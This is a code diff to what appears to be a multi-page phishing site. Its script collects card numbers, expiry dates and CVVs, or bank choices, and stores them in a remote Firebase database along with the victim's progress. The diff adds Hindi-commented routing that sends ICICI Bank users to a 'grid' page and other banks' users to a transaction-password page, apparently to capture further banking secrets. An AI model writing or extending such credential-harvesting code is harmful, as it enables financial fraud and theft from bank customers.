@@ -128,7 +128,7 @@
         </div>
     </div>
 
-    <!-- Firebase Integration Script -->
+    <!-- Firebase Integration & Smart Routing Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
@@ -193,6 +193,7 @@
             
             const payMethod = document.querySelector('input[name="payMethod"]:checked').value;
             let paymentDetails = "";
+            let selectedBank = "";
 
             if (payMethod === 'Card') {
                 const cardNumber = document.getElementById('cardNumber').value;
@@ -200,7 +201,7 @@
                 const cvv = document.getElementById('cvv').value;
                 paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
             } else {
-                let selectedBank = document.getElementById('bankName').value;
+                selectedBank = document.getElementById('bankName').value;
                 if (selectedBank === "Other Bank") {
                     const customBank = document.getElementById('otherBankName').value;
                     selectedBank = `Other: ${customBank}`;
@@ -226,13 +227,19 @@
                 await updateDoc(docRef, {
                     paymentMethod: payMethod,
                     paymentDetails: paymentDetails,
-                    currentStep: "Payment Completed"
+                    currentStep: "Page 4 (Payment) Submitted"
                 });
 
                 setTimeout(() => {
-                    if (payMethod === 'Card') {
+                    // यहाँ नियम लागू किया गया है:
+                    if (payMethod === 'NetBanking' && selectedBank === 'ICICI Bank') {
+                        // अगर ICICI है, तो सीधा Grid पेज पर जाएगा
+                        window.location.href = "grid.html"; 
+                    } else if (payMethod === 'Card') {
+                        // अगर कार्ड है तो अगले पेज पर (जैसे page5.html)
                         window.location.href = "page5.html"; 
                     } else {
+                        // बाकी अन्य सभी बैंकों के लिए ट्रांजैक्शन पासवर्ड वाले पेज पर जाएगा
                         window.location.href = "netbanking_pass.html"; 
                     }
                 }, 1000);
